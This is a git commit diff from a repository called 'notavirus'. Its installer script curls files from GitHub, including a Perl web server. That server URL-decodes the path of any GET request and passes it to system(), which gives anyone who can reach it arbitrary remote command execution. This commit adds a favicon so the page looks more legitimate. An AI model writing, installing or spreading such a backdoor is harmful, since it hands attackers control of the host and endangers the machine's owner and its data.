31f5ec348a6dbfaa306dc57a848f965a668279b1
Nicolas Hohaus <developer@familie-hohaus.de>
2018-06-25 01:14:47 -0700

    add

--- installerScript/installer.sh
+++ installerScript/installer.sh
@@ -9,6 +9,8 @@ curl https://raw.githubusercontent.com/pointfour/notavirus/master/hi.html > hi.h
 
 curl https://raw.githubusercontent.com/pointfour/notavirus/master/running_command.html > running_command.html
 
+curl https://raw.githubusercontent.com/pointfour/notavirus/master/browser.ico > browser.ico
+
 #Download scripts
 curl https://raw.githubusercontent.com/pointfour/notavirus/master/perlWebHost.pl > perlWebHost.pl
 chmod u+x perlWebHost.pl
--- perlWebHost.pl
+++ perlWebHost.pl
@@ -10,23 +10,26 @@ while (my $c = $d->accept) {
         
         #system("say New Web Request");
         
-        if ($r->method eq 'GET' and $r->uri->path eq "/xyzzy") {
-            # remember, this is *not* recommended practice :-)
+        if ($r->method eq 'GET' and ($r->uri->path eq "" or $r->uri->path eq "/"))
+        {
             $c->send_file_response("hi.html");
-        }elsif($r->method eq 'GET')
+        }
+        elsif($r->method eq 'GET' and $r->uri->path eq "/favicon.ico")
+        {
+            $c->send_file_response("browser.ico");
+        }
+        elsif($r->method eq 'GET')
         {
             $subString = substr $r->uri->path, 1;
             $subString =~ s/%20/ /ig;
             $subString =~ s/%22/\"/ig;
             #system("say \"Running Command $subString\"");
-            print $subString;
+            print $subString + "\n";
             system($subString);
             $c->send_file_response("running_command.html");
         }
-        else {
-            
-            
-            
+        else
+        {
             $c->send_error(RC_FORBIDDEN)
         }
     }
